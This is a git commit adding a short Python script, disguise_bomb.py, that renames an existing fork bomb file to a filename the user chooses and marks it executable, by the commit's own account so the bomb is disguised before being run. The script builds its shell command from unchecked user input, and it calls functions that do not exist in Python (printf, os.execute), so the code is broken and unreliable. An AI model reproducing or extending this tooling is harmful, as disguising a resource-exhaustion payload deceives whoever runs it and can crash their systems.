1e5e3157b16576a4f87fb5da81335bd0aceaff07
Gul'dan <92905002+K0K0SHA@users.noreply.github.com>
2023-07-07 06:07:58 -0400

    Create disguise_bomb.py
    Disguise fork bomb with a new name, and make it executable

---
+++ disguise_bomb.py
@@ -0,0 +1,15 @@
+# code header
+import os
+
+fbomb_name = "./bomb"
+printf("Disguise and prepare fork bomb for execution.")
+new_name = input("Please enter a new filename (including extension") # you can make weirdly named files like this
+if new_name:
+    print("renaming...")
+    os.rename(fbomb_name, new_name)
+    cmdstr = "chmod +x "
+    cmdstr += new_name
+    print("executing: \n" + cmdstr)
+    os.execute(cmdstr)
+else:
+    print("error in new_name")  
